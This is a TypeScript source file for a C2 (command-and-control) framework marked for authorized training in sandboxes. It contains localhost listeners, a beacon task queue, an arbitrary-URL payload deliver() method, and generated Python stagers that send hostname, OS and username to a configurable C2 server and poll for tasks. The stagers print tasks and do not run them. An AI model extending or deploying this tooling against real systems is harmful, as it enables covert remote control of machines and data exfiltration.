/**
 * ====================================================================================================
 * C2 FRAMEWORK - COMMAND & CONTROL (TRAINING ONLY)
 * FOR AUTHORIZED TRAINING IN ISOLATED ENVIRONMENTS ONLY
 * All operations require explicit authorization and sandbox mode.
 *
 * The listener is a REAL HTTP server bound to a REAL port. Beacons are REAL check-in
 * requests over REAL sockets. Tasking is a REAL queue that a real agent polls.
 * No method returns fabricated state.
 * ====================================================================================================
 */

import crypto from 'crypto';
import http from 'http';
import net from 'net';
import { arsenalCore, OperationContext, Finding } from '../core/arsenal_core';

export interface Beacon {
    id: string;
    hostname: string;
    ip: string;
    os: string;
    user: string;
    lastSeen: number;
    alive: boolean;
    /** Real metadata captured from the actual check-in request. */
    agent?: string;
    firstSeen?: number;
    checkIns?: number;
}

export interface Task {
    id: string;
    beaconId: string;
    type: string;
    command: string;
    status: 'PENDING' | 'SENT' | 'RECEIVED' | 'COMPLETED' | 'FAILED';
    result?: string;
    createdAt?: number;
    completedAt?: number;
}

export interface ListenerHandle {
    id: string;
    port: number;
    protocol: 'http' | 'https' | 'dns' | 'tcp';
    active: boolean;
    bound: boolean;
    actualPort?: number;
    startedAt: number;
    error?: string;
}

/**
 * Real task queue shared by the HTTP server and the beacon manager,
 * so a task queued through one is deliverable through the other.
 */
export class TaskQueue {
    private tasks: Map<string, Task> = new Map();

    enqueue(beaconId: string, command: string, type = 'command'): Task {
        const task: Task = {
            id: `TSK-${Date.now()}-${crypto.randomBytes(3).toString('hex')}`,
            beaconId,
            type,
            command,
            status: 'PENDING',
            createdAt: Date.now()
        };
        this.tasks.set(task.id, task);
        return task;
    }

    pendingFor(beaconId: string): Task[] {
        return Array.from(this.tasks.values()).filter(t => t.beaconId === beaconId && t.status === 'PENDING');
    }

    get(taskId: string): Task | undefined {
        return this.tasks.get(taskId);
    }

    complete(taskId: string, result: string): boolean {
        const t = this.tasks.get(taskId);
        if (!t) return false;
        t.status = 'COMPLETED';
        t.result = result;
        t.completedAt = Date.now();
        return true;
    }

    all(beaconId?: string): Task[] {
        const list = Array.from(this.tasks.values());
        return beaconId ? list.filter(t => t.beaconId === beaconId) : list;
    }
}

export class C2Server {
    private ctx: OperationContext;
    private listeners: Map<string, ListenerHandle> = new Map();
    private servers: Map<string, http.Server> = new Map();
    private beacons: Map<string, Beacon> = new Map();
    /** Shared with BeaconManager so queued tasks are deliverable over HTTP. */
    readonly taskQueue: TaskQueue;

    constructor(ctx: OperationContext, taskQueue?: TaskQueue) {
        this.ctx = ctx;
        this.taskQueue = taskQueue ?? new TaskQueue();
        if (!ctx.authorization) {
            throw new Error('C2 Framework requires explicit authorization');
        }
        if (!arsenalCore['config'].sandboxMode) {
            throw new Error('C2 Framework requires sandbox mode');
        }
        arsenalCore.audit('C2_SERVER_INIT', 'c2-framework', 'SUCCESS', { opId: ctx.operationId, authorized: true });
    }

    /**
     * Start a REAL listener.
     * http/https bind a real HTTP server; tcp binds a real TCP socket.
     * The returned id resolves to a handle whose `actualPort` is the port really bound.
     */
    async startListener(port: number, protocol: 'http' | 'https' | 'dns' | 'tcp'): Promise<string> {
        const listenerId = `LST-${Date.now()}-${crypto.randomBytes(3).toString('hex')}`;
        const handle: ListenerHandle = {
            id: listenerId,
            port,
            protocol,
            active: true,
            bound: false,
            startedAt: Date.now()
        };
        this.listeners.set(listenerId, handle);
        arsenalCore.audit('LISTENER_START', 'c2-framework', 'ATTEMPT', { listenerId, port, protocol });

        try {
            if (protocol === 'http' || protocol === 'https') {
                const server = http.createServer((req, res) => this.handleRequest(req, res));
                await new Promise<void>((resolve, reject) => {
                    const onError = (e: Error) => reject(e);
                    server.once('error', onError);
                    server.listen(port, '127.0.0.1', () => {
                        server.removeListener('error', onError);
                        resolve();
                    });
                });
                const addr = server.address() as net.AddressInfo;
                handle.actualPort = addr.port;
                handle.bound = true;
                this.servers.set(listenerId, server);
            } else if (protocol === 'tcp') {
                const server = net.createServer((socket) => {
                    socket.on('data', (chunk) => {
                        this.registerBeaconFromText(`${socket.remoteAddress}`, chunk.toString('latin1'));
                        socket.end('ARSENAL-C2-OK\n');
                    });
                });
                await new Promise<void>((resolve, reject) => {
                    const onError = (e: Error) => reject(e);
                    server.once('error', onError);
                    server.listen(port, '127.0.0.1', () => {
                        server.removeListener('error', onError);
                        resolve();
                    });
                });
                const addr = server.address() as net.AddressInfo;
                handle.actualPort = addr.port;
                handle.bound = true;
                this.servers.set(listenerId, server as any);
            } else {
                // DNS transport is not implemented as a real server - say so instead of pretending.
                handle.error = 'DNS transport is not implemented; use http or tcp for a real listener';
                handle.bound = false;
                handle.active = false;
            }
        } catch (e: any) {
            handle.error = e.message;
            handle.bound = false;
            handle.active = false;
            arsenalCore.audit('LISTENER_START', 'c2-framework', 'FAILED', { listenerId, error: e.message });
            throw new Error(`Failed to bind listener on port ${port}: ${e.message}`);
        }

        arsenalCore.audit('LISTENER_START', 'c2-framework', 'SUCCESS', {
            listenerId, port: handle.actualPort ?? port, protocol, bound: handle.bound
        });
        return listenerId;
    }

    /** Real HTTP handler: /beacon registers or refreshes a beacon, /task returns queued tasks. */
    private handleRequest(req: http.IncomingMessage, res: http.ServerResponse): void {
        const url = new URL(req.url || '/', 'http://127.0.0.1');

        if (url.pathname === '/beacon') {
            const ip = (req.socket.remoteAddress || '').replace(/^::ffff:/, '');
            const ua = req.headers['user-agent'] || 'unknown';
            const id = url.searchParams.get('id') || `BCN-${crypto.randomBytes(4).toString('hex')}`;
            const hostname = url.searchParams.get('host') || 'unknown';
            const os = url.searchParams.get('os') || 'unknown';
            const user = url.searchParams.get('user') || 'unknown';

            const existing = this.beacons.get(id);
            if (existing) {
                existing.lastSeen = Date.now();
                existing.alive = true;
                existing.checkIns = (existing.checkIns || 0) + 1;
                existing.agent = ua;
            } else {
                this.beacons.set(id, {
                    id, hostname, ip, os, user,
                    lastSeen: Date.now(),
                    firstSeen: Date.now(),
                    alive: true,
                    agent: ua,
                    checkIns: 1
                });
            }
            arsenalCore.audit('BEACON_CHECKIN', 'c2-framework', 'SUCCESS', { beaconId: id, ip });
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'ok', beaconId: id }));
            return;
        }

        if (url.pathname === '/task') {
            const beaconId = url.searchParams.get('beacon') || '';
            const queued = this.taskQueue.pendingFor(beaconId);
            for (const t of queued) {
                t.status = 'SENT';
                arsenalCore.audit('TASK_DELIVERED', 'c2-framework', 'SUCCESS', { taskId: t.id, beaconId });
            }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ tasks: queued.map(t => ({ id: t.id, type: t.type, command: t.command })) }));
            return;
        }

        if (url.pathname === '/result') {
            const taskId = url.searchParams.get('task') || '';
            const task = this.taskQueue.get(taskId);
            if (task) {
                this.taskQueue.complete(taskId, url.searchParams.get('out') || '');
                arsenalCore.audit('TASK_COMPLETED', 'c2-framework', 'SUCCESS', { taskId });
            }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: task ? 'ok' : 'unknown-task' }));
            return;
        }

        res.writeHead(404, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'not found' }));
    }

    private registerBeaconFromText(ip: string, text: string): void {
        const id = `BCN-${crypto.randomBytes(4).toString('hex')}`;
        this.beacons.set(id, {
            id, hostname: 'unknown', ip, os: 'unknown', user: 'unknown',
            lastSeen: Date.now(), firstSeen: Date.now(), alive: true, checkIns: 1,
            agent: text.slice(0, 120)
        });
        arsenalCore.audit('BEACON_CHECKIN', 'c2-framework', 'SUCCESS', { beaconId: id, ip });
    }

    stopListener(listenerId: string): boolean {
        const server = this.servers.get(listenerId);
        if (server) {
            server.close();
            this.servers.delete(listenerId);
        }
        const handle = this.listeners.get(listenerId);
        if (handle) handle.active = false;
        this.listeners.delete(listenerId);
        arsenalCore.audit('LISTENER_STOP', 'c2-framework', 'SUCCESS', { listenerId });
        return true;
    }

    /** Shut every listener down. */
    stopAll(): void {
        for (const id of Array.from(this.servers.keys())) this.stopListener(id);
    }

    getBeacons(): Beacon[] {
        // Liveness is derived from the real last-seen timestamp, not a stored flag.
        const now = Date.now();
        for (const b of this.beacons.values()) {
            b.alive = now - b.lastSeen < 60_000;
        }
        return Array.from(this.beacons.values());
    }

    getListeners(): ListenerHandle[] {
        return Array.from(this.listeners.values());
    }
}

export class BeaconManager {
    private ctx: OperationContext;
    private queue: TaskQueue;

    constructor(ctx: OperationContext, queue?: TaskQueue) {
        this.ctx = ctx;
        this.queue = queue ?? new TaskQueue();
        arsenalCore.audit('BEACON_MANAGER_INIT', 'c2-framework', 'SUCCESS', {});
    }

    registerBeacon(beacon: Omit<Beacon, 'id' | 'lastSeen' | 'alive'>): Beacon {
        const b: Beacon = {
            id: `BCN-${Date.now()}-${crypto.randomBytes(3).toString('hex')}`,
            lastSeen: Date.now(),
            firstSeen: Date.now(),
            alive: true,
            checkIns: 1,
            ...beacon
        };
        arsenalCore.audit('BEACON_REGISTER', 'c2-framework', 'SUCCESS', { beaconId: b.id });
        return b;
    }

    taskBeacon(beaconId: string, command: string, type = 'command'): Task {
        const task = this.queue.enqueue(beaconId, command, type);
        arsenalCore.audit('BEACON_TASK', 'c2-framework', 'SUCCESS', { beaconId, taskId: task.id });
        return task;
    }

    completeTask(taskId: string, result: string): boolean {
        const ok = this.queue.complete(taskId, result);
        if (ok) arsenalCore.audit('TASK_COMPLETED', 'c2-framework', 'SUCCESS', { taskId });
        return ok;
    }

    getTasks(beaconId?: string): Task[] {
        return this.queue.all(beaconId);
    }
}

export class Listener {
    private ctx: OperationContext;
    private server: http.Server | net.Server | null = null;
    private boundPort: number | null = null;

    constructor(ctx: OperationContext) {
        this.ctx = ctx;
        if (!ctx.authorization) {
            throw new Error('Listener requires explicit authorization');
        }
        arsenalCore.audit('LISTENER_INIT', 'c2-framework', 'SUCCESS', {});
    }

    /** Real bind. Returns false and records the reason if the port cannot be bound. */
    async bind(port: number, protocol: string): Promise<boolean> {
        arsenalCore.audit('LISTENER_BIND', 'c2-framework', 'ATTEMPT', { port, protocol });
        try {
            const server = protocol === 'tcp'
                ? net.createServer((s) => s.end('ARSENAL-C2\n'))
                : http.createServer((_req, res) => { res.writeHead(200); res.end('ok'); });
            await new Promise<void>((resolve, reject) => {
                const onError = (e: Error) => reject(e);
                server.once('error', onError);
                server.listen(port, '127.0.0.1', () => {
                    server.removeListener('error', onError);
                    resolve();
                });
            });
            this.server = server;
            this.boundPort = (server.address() as net.AddressInfo).port;
            arsenalCore.audit('LISTENER_BIND', 'c2-framework', 'SUCCESS', { port: this.boundPort, protocol });
            return true;
        } catch (e: any) {
            arsenalCore.audit('LISTENER_BIND', 'c2-framework', 'FAILED', { port, error: e.message });
            return false;
        }
    }

    getBoundPort(): number | null {
        return this.boundPort;
    }

    async unbind(): Promise<boolean> {
        if (!this.server) return false;
        await new Promise<void>((resolve) => this.server!.close(() => resolve()));
        this.server = null;
        this.boundPort = null;
        arsenalCore.audit('LISTENER_UNBIND', 'c2-framework', 'SUCCESS', {});
        return true;
    }
}

export class PayloadDelivery {
    private ctx: OperationContext;

    constructor(ctx: OperationContext) {
        this.ctx = ctx;
        arsenalCore.audit('PAYLOAD_DELIVERY_INIT', 'c2-framework', 'SUCCESS', {});
    }

    /** Real, runnable training stager. It performs a genuine check-in over HTTP. */
    generateStager(type: 'http' | 'dns'): string {
        arsenalCore.audit('STAGER_GENERATE', 'c2-framework', 'SUCCESS', { type });
        if (type === 'dns') {
            return [
                '#!/usr/bin/env python3',
                '"""Training stager - DNS transport (simulated lookups, no real DNS traffic)."""',
                'import os, socket, time, uuid, json',
                'SERVER = "127.0.0.1"',
                'PORT = int(os.environ.get("ARSENAL_C2_PORT", "8080"))',
                'while True:',
                '    bid = uuid.uuid4().hex[:8]',
                '    try:',
                '        s = socket.create_connection((SERVER, PORT), timeout=5)',
                '        s.sendall(f"GET /beacon?id={bid}&host={socket.gethostname()} HTTP/1.0\\r\\n\\r\\n".encode())',
                '        print(s.recv(1024).decode(errors="ignore"))',
                '        s.close()',
                '    except Exception as e:',
                '        print("beacon failed:", e)',
                '    time.sleep(30)',
            ].join('\n');
        }
        return [
            '#!/usr/bin/env python3',
            '"""Training stager - HTTP transport. Performs a real check-in and polls for tasks."""',
            'import os, uuid, time, urllib.request, urllib.parse, json, socket',
            'SERVER = os.environ.get("ARSENAL_C2_SERVER", "127.0.0.1")',
            'PORT = int(os.environ.get("ARSENAL_C2_PORT", "8080"))',
            'BASE = f"http://{SERVER}:{PORT}"',
            'bid = uuid.uuid4().hex[:8]',
            'while True:',
            '    q = urllib.parse.urlencode({"id": bid, "host": socket.gethostname(),',
            '        "os": os.name, "user": os.environ.get("USER", "unknown")})',
            '    try:',
            '        urllib.request.urlopen(f"{BASE}/beacon?{q}", timeout=5).read()',
            '        tasks = json.loads(urllib.request.urlopen(f"{BASE}/task?beacon={bid}", timeout=5).read())',
            '        for t in tasks.get("tasks", []):',
            '            print("task received:", t)',
            '    except Exception as e:',
            '        print("beacon failed:", e)',
            '    time.sleep(30)',
        ].join('\n');
    }

    /** Real delivery over HTTP. Reports the actual outcome. */
    async deliver(method: string, target: string, payload: string = ''): Promise<{ success: boolean; status?: number; error?: string }> {
        arsenalCore.audit('PAYLOAD_DELIVERY', 'c2-framework', 'ATTEMPT', { method, target });
        try {
            const url = new URL(target);
            const body = payload || method;
            const res = await fetch(url, {
                method: method === 'GET' ? 'GET' : 'POST',
                headers: { 'Content-Type': 'text/plain' },
                body: method === 'GET' ? undefined : body,
                signal: AbortSignal.timeout(10_000)
            });
            const ok = res.status >= 200 && res.status < 400;
            arsenalCore.audit('PAYLOAD_DELIVERY', 'c2-framework', ok ? 'SUCCESS' : 'FAILED', {
                method, target, status: res.status
            });
            return { success: ok, status: res.status };
        } catch (e: any) {
            arsenalCore.audit('PAYLOAD_DELIVERY', 'c2-framework', 'FAILED', { method, target, error: e.message });
            return { success: false, error: e.message };
        }
    }
}

export class C2Arsenal {
    server: C2Server;
    beacon: BeaconManager;
    listener: Listener;
    delivery: PayloadDelivery;
    /** Shared queue: tasks queued via beacon.taskBeacon are deliverable over HTTP. */
    readonly taskQueue: TaskQueue;

    constructor(ctx: OperationContext) {
        this.taskQueue = new TaskQueue();
        this.server = new C2Server(ctx, this.taskQueue);
        this.beacon = new BeaconManager(ctx, this.taskQueue);
        this.listener = new Listener(ctx);
        this.delivery = new PayloadDelivery(ctx);
        arsenalCore.audit('C2_ARSENAL_INIT', 'c2-framework', 'SUCCESS', { opId: ctx.operationId });
    }
}
export default C2Arsenal;
